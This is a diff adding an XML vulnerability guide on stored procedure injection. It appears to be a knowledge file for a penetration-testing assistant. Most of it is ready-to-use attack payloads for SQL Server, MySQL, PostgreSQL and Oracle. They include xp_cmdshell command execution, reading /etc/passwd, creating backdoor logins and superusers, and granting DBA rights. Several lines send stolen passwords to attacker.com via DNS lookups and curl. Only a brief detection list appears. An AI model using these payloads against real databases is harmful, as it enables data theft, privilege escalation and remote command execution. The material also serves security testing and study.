@@ -1,0 +1,237 @@
+<vulnerability_guide>
+  <title>STORED PROCEDURE INJECTION</title>
+
+  <critical>Stored procedures centralize database logic but create injection risks when they dynamically construct SQL. Unlike simple SQL injection, stored procedure injection can bypass input filtering, escalate privileges through DEFINER/EXECUTE AS contexts, and access administrative functionality.</critical>
+
+  <scope>
+    - Dynamic SQL in stored procedures
+    - Second-order injection via procedures
+    - Privilege escalation through procedures
+    - Cross-procedure injection
+    - Framework-specific procedure attacks
+    - Native procedure exploitation
+  </scope>
+
+  <methodology>
+    1. STORED PROCEDURE ENUMERATION
+       {% raw %}
+       # SQL Server - List procedures
+       SELECT name, type_desc FROM sys.procedures;
+       SELECT OBJECT_DEFINITION(object_id) FROM sys.procedures;
+
+       # MySQL - List procedures
+       SELECT routine_name, definer FROM information_schema.routines
+       WHERE routine_type = 'PROCEDURE';
+       SHOW CREATE PROCEDURE procedure_name;
+
+       # PostgreSQL - List functions
+       SELECT routine_name FROM information_schema.routines
+       WHERE routine_type = 'FUNCTION';
+       SELECT prosrc FROM pg_proc WHERE proname = 'func_name';
+
+       # Oracle - List procedures
+       SELECT object_name FROM user_procedures;
+       SELECT text FROM user_source WHERE name = 'PROC_NAME';
+       {% endraw %}
+
+    2. DYNAMIC SQL IDENTIFICATION
+       {% raw %}
+       # SQL Server - Look for EXEC/sp_executesql
+       SELECT OBJECT_DEFINITION(object_id) FROM sys.procedures
+       WHERE OBJECT_DEFINITION(object_id) LIKE '%EXEC%'
+          OR OBJECT_DEFINITION(object_id) LIKE '%sp_executesql%';
+
+       # Vulnerable pattern:
+       CREATE PROCEDURE SearchUsers @search VARCHAR(100)
+       AS
+       BEGIN
+           EXEC('SELECT * FROM users WHERE name LIKE ''%' + @search + '%''')
+       END
+
+       # Injection:
+       EXEC SearchUsers @search = '''; DROP TABLE users; --'
+
+       # MySQL - Look for PREPARE/EXECUTE
+       -- Similar pattern with CONCAT in PREPARE statement
+       {% endraw %}
+
+    3. PARAMETER INJECTION
+       {% raw %}
+       # SQL Server injection
+       EXEC vulnerable_proc @param = ''' OR 1=1 --'
+       EXEC vulnerable_proc @param = '''; EXEC xp_cmdshell ''whoami''; --'
+
+       # MySQL injection
+       CALL vulnerable_proc(''' OR 1=1 #');
+       CALL vulnerable_proc('''; SELECT LOAD_FILE(''/etc/passwd''); #');
+
+       # PostgreSQL injection
+       SELECT vulnerable_func(''' OR 1=1 --');
+       SELECT vulnerable_func('''; COPY (SELECT '''') TO PROGRAM ''id''; --');
+
+       # Oracle injection
+       EXEC vulnerable_proc(''' OR 1=1 --');
+       EXEC vulnerable_proc('''; EXECUTE IMMEDIATE ''GRANT DBA TO attacker''; --');
+       {% endraw %}
+
+    4. SECOND-ORDER INJECTION
+       {% raw %}
+       # Data stored, later used in procedure
+
+       # Step 1: Insert payload
+       INSERT INTO users (name) VALUES ('''; DROP TABLE data; --');
+
+       # Step 2: Procedure uses stored data unsafely
+       CREATE PROCEDURE ProcessUsers
+       AS
+       BEGIN
+           DECLARE @name VARCHAR(100);
+           SELECT @name = name FROM users WHERE id = 1;
+           EXEC('SELECT * FROM data WHERE owner = ''' + @name + '''');
+       END
+
+       # Payload executes when procedure runs
+
+       # Common in:
+       # - Batch processing jobs
+       # - Report generation
+       # - Audit logging
+       {% endraw %}
+
+    5. PRIVILEGE CONTEXT EXPLOITATION
+       {% raw %}
+       # SQL Server - EXECUTE AS
+       CREATE PROCEDURE AdminProc
+       WITH EXECUTE AS OWNER  -- Runs as db_owner
+       AS
+       BEGIN
+           EXEC('SELECT ''' + @input + '''')  -- Vulnerable
+       END
+
+       # MySQL - DEFINER
+       CREATE PROCEDURE priv_proc()
+       SQL SECURITY DEFINER  -- Runs as creator
+       BEGIN
+           -- Vulnerable dynamic SQL here
+       END
+
+       # Attack: Inject SQL that wouldn't work with caller's permissions
+       # Procedure's elevated context executes it
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <stacked_queries>
+      {% raw %}
+      # Execute multiple statements
+
+      # SQL Server - Full stacked query support
+      @param = '''; CREATE LOGIN hacker WITH PASSWORD = ''pass''; --'
+
+      # MySQL - Limited (depends on API)
+      # Many drivers allow: '; DROP TABLE x; --
+
+      # PostgreSQL - Supports stacked queries
+      @param = '''; CREATE USER hacker SUPERUSER; --'
+
+      # Oracle - Requires specific contexts
+      # Generally more restricted
+      {% endraw %}
+    </stacked_queries>
+
+    <out_of_band_extraction>
+      {% raw %}
+      # Extract data through alternative channels
+
+      # SQL Server - DNS exfiltration
+      EXEC('EXEC master..xp_dirtree ''\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a''')
+
+      # MySQL - File-based
+      INTO OUTFILE '\\\\attacker.com\\share\\data.txt'
+
+      # PostgreSQL - Network
+      COPY (SELECT * FROM users) TO PROGRAM 'curl attacker.com?data=$(cat)'
+
+      # Time-based blind
+      IF (condition) WAITFOR DELAY '00:00:05'
+      {% endraw %}
+    </out_of_band_extraction>
+
+    <error_based_extraction>
+      {% raw %}
+      # Extract data through error messages
+
+      # SQL Server
+      EXEC('SELECT * FROM users WHERE id = CONVERT(int, (SELECT TOP 1 password FROM users))--')
+
+      # MySQL
+      CALL proc(''' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1))) #');
+
+      # PostgreSQL
+      SELECT CAST((SELECT password FROM users LIMIT 1) AS INTEGER);
+
+      # Parse error messages for extracted data
+      {% endraw %}
+    </error_based_extraction>
+
+    <procedure_chaining>
+      {% raw %}
+      # Call other procedures through injection
+
+      # SQL Server
+      @param = '''; EXEC xp_cmdshell ''whoami''; --'
+      @param = '''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; --'
+
+      # MySQL
+      # Call administrative procedures
+      @param = '''; CALL mysql.p_kill_session(123); #'
+
+      # PostgreSQL
+      @param = '''; SELECT lo_import(''/etc/passwd''); --'
+      {% endraw %}
+    </procedure_chaining>
+
+    <truncation_attacks>
+      {% raw %}
+      # Exploit parameter length limits
+
+      # Variable declared as VARCHAR(50)
+      # Input is 100 chars, truncated
+
+      # Strategy:
+      # Craft payload where truncation removes quote
+      # 'AAAA...AAAA' -> 'AAAA...AAAA  (49 As + open quote)
+      # Truncated to 50 chars, closing quote removed
+
+      # Result: Injection through truncation
+      {% endraw %}
+    </truncation_attacks>
+  </advanced_techniques>
+
+  <detection>
+    - Static analysis of procedure source code
+    - Monitor for unusual procedure calls
+    - Track dynamic SQL execution
+    - Alert on privilege escalation patterns
+    - Audit parameter values in procedure logs
+  </detection>
+
+  <validation>
+    - Identify procedures with dynamic SQL
+    - Successfully inject through parameters
+    - Demonstrate privilege escalation
+    - Extract data through procedures
+    - Document injection vectors
+  </validation>
+
+  <pro_tips>
+    - Procedures with EXECUTE AS/DEFINER are high-value targets
+    - Second-order injection bypasses input validation
+    - Error messages often reveal procedure internals
+    - Stacked queries expand attack surface significantly
+    - Check for dynamic SQL in triggers too
+    - Native procedures (xp_*, dbms_*) often have injection risks
+  </pro_tips>
+
+  <remember>Stored procedures are trusted code within the database, often running with elevated privileges. Dynamic SQL inside procedures creates injection points that bypass perimeter defenses. The procedure's security context, not the caller's, determines what the injected code can do. One vulnerable procedure can compromise the entire database.</remember>
+</vulnerability_guide>
